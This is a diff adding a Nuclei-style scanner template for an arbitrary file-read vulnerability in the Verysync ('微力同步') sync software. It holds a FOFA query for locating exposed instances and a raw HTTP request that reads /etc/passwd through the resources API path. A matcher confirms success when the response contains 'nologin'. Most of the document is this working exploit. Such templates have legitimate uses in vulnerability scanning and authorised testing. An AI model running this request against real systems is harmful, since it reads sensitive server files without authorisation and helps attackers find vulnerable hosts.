@@ -1,0 +1,26 @@
+id: verysync-resources-file-read
+
+info:
+  name: "微力同步 Verysync resources 组件文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="微力同步-Verysync"
+      由于 Verysync 系统 resources 模块未正确实施访问控制策略，攻击者可通过构造特定路径参数实现对非授权文件的读取操作。该缺陷允许远程攻击者绕过预期的安全限制，获取系统敏感文件内容。
+  tags: 微力同步
+
+http:
+- raw:
+  - |
+    GET /rest/f/api/resources/f96956469e7be39d/etc/passwd?override=false HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'nologin'
